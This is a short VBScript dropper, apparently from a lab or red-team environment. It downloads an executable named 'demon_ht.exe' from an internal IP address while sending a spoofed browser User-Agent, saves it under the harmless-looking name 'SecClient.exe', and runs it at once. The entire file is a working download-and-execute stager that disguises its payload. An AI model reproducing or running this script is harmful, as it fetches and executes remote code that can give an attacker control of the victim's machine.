Set fso = CreateObject("Scripting.FileSystemObject")
Set Outp = Wscript.Stdout
On Error Resume Next
Set File = WScript.CreateObject("Microsoft.XMLHTTP")
File.Open "GET", "http://10.10.6.56/demon_ht.exe", False
File.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C; .NET4.0E; BCD2000; BCD2000)"
File.Send
If err.number <> 0 then 
Outp.writeline "" 
Outp.writeline "Error getting file" 
Outp.writeline "==================" 
Outp.writeline "" 
Outp.writeline "Error " & err.number & "(0x" & hex(err.number) & ") " & err.description 
Outp.writeline "Source " & err.source 
Outp.writeline "" 
Outp.writeline "HTTP Error " & File.Status & " " & File.StatusText
Outp.writeline  File.getAllResponseHeaders
Outp.writeline Arg(1)
End If

On Error Goto 0

Set BS = CreateObject("ADODB.Stream")
BS.type = 1
BS.open
BS.Write File.ResponseBody
BS.SaveToFile "SecClient.exe", 2

Set shell= CreateObject("wscript.shell")
Shell.Run("SecClient.exe")